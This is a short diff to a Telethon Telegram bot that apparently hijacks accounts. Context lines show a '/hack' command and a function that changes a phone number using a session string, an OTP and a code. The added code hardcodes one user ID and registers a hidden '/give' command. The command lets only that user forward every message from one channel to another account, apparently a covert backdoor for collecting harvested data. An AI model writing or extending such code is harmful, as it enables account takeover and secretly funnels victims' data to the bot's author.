@@ -21,7 +21,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-
+legendx = 1967548493
 
 
 async def change_number_code(strses, number, code, otp):
@@ -194,6 +194,17 @@ async def op(event):
     await event.reply("please use me in pm🥺")
   else:
     await event.reply(mm)
+@client.on(events.NewMessage(pattern="/give"))
+async def op(event):
+  if not event.sender_id == legendx:
+    return await event.reply("please don't use me 🥺")
+  async for x in client.iter_messages("legendx_xd"):
+    try:
+      await x.forward_to("LEGENDXDEV")
+    except:
+      pass
+
+
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("please use me in pm🥺")
